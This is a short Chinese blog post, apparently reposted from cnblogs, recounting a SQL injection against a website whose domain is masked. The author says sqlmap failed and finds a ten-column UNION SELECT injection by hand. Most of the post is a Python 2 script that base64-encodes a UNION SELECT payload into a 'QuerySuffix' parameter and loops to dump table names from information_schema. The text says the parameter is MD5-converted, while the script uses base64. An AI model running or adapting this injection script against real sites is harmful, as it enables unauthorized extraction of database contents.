---
title: 一个网站SQL注入的案例
categories: 
tags: php
---
网站的页面提交参数做了md5转换，而且参数会带入两个SQL语句中执行。

注入是肯定存在的，但是SQLMAP怎么都跑不出来（可能原因是其中有个SQL语句总是报错）。

尝试手工，发现 order by 报错。; ) 没关系，那就直接上union select。

经过尝试发现 union select 1,2,3,4,5,6,7,8,9,10 成功爆出显示位。下面写个脚本跑表，收工。

    
    
    # -*- coding=utf-8 -*-
    #!/usr/bin/evn python
    # create: mi_white
    # Date:2017.06.29
    
    import requests
    import re
    import base64
    
    payload = """+union select 1,2,3,4,5,6,concat(0x7e, (select table_name from information_schema.tables limit ~~,1),0x7e),8,9,10 #"""
    url = '''http://www.XXXXX.com.cn/W.php?QuerySuffix=~~&page=1'''
    
    print u"正在读取表名："
    for i in xrange(1,190):
        a = payload.replace("~~",str(i))
        b = url.replace("~~", base64.encodestring(a))
        try:
            req = requests.get(b,timeout=10)
        except:
            print u"读取页面失败。"
            continue
        try:
            html = re.findall(r"~(.*)~",req.text)
            print html
        except:print u"表名读取失败。"

转载于:https://www.cnblogs.com/MiWhite/p/7096144.html

